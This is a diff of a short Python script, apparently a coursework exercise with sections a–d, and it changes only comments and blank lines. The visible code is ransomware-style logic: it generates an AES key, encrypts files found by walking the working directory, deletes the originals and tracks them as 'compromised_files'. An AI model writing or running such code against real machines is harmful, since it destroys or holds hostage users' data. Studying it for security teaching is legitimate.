@@ -3,11 +3,11 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 
-# a.
+# a & b.
 pk = b'\xb1\x0f\xe8\x1ayY\x81zx\x87$"\x93\x9cI\x90'
-
-# b.
 sk = get_random_bytes(16)
+
+
 
 #c.
 def generate_encrypted_shared_key(public_key, shared_key):
@@ -17,6 +17,8 @@ def generate_encrypted_shared_key(public_key, shared_key):
     result_file.write(encrypted_shared_key)
     result_file.close()
     return
+
+
 
 # d.
 def encrypt(file, shared_key):
@@ -34,8 +36,6 @@ def encrypt(file, shared_key):
     os.remove(file)
     return encrypted
 
-
-
 def encrypt_walk(shared_key):
     compromised_files = []
     current_folder = os.getcwd()
@@ -51,6 +51,7 @@ def encrypt_walk(shared_key):
                 print(f"An error occured encrypting file: {file}\n")
 
     return compromised_files
+
 
 
 # run
